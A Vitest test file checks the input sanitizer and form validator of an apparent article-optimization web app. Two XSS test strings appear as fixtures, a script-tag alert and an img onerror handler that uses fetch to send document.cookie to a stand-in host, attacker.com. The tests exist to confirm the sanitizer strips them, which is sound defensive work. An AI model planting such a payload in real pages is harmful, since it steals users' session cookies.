import { describe, it, expect } from 'vitest';
import { sanitizeInput, validateOptimizationInput } from './security';

describe('Security and Input Sanitization (NFRs)', () => {
  it('sanitizes malicious script tags to prevent XSS injection', () => {
    const dirty = '<script>alert("xss")</script>Breaking News Article';
    const clean = sanitizeInput(dirty);
    expect(clean).not.toContain('<script>');
    expect(clean).not.toContain('alert(');
    expect(clean).toContain('Breaking News Article');
  });

  it('strips malicious img onerror handlers', () => {
    const dirty = '<img src=x onerror="fetch(`http://attacker.com?leak=`+document.cookie)" />Page Title';
    const clean = sanitizeInput(dirty);
    expect(clean).not.toContain('onerror');
    expect(clean).not.toContain('document.cookie');
  });

  it('validates required fields and marks invalid inputs with errors', () => {
    const emptyForm = {
      articleTitle: '',
      articleUrl: '',
      metricType: '',
      currentValue: '',
      targetValue: '',
    };
    const validation = validateOptimizationInput(emptyForm);
    expect(validation.isValid).toBe(false);
    expect(validation.errors.articleTitle).toBeDefined();
    expect(validation.errors.articleUrl).toBeDefined();
    expect(validation.errors.currentValue).toBeDefined();
  });

  it('flags malformed URLs as invalid', () => {
    const invalidUrlForm = {
      articleTitle: 'Breaking News 2026',
      articleUrl: 'not-a-valid-url',
      metricType: 'LCP',
      currentValue: '3.5',
      targetValue: '1.8',
    };
    const validation = validateOptimizationInput(invalidUrlForm);
    expect(validation.isValid).toBe(false);
    expect(validation.errors.articleUrl).toMatch(/valid url/i);
  });
});
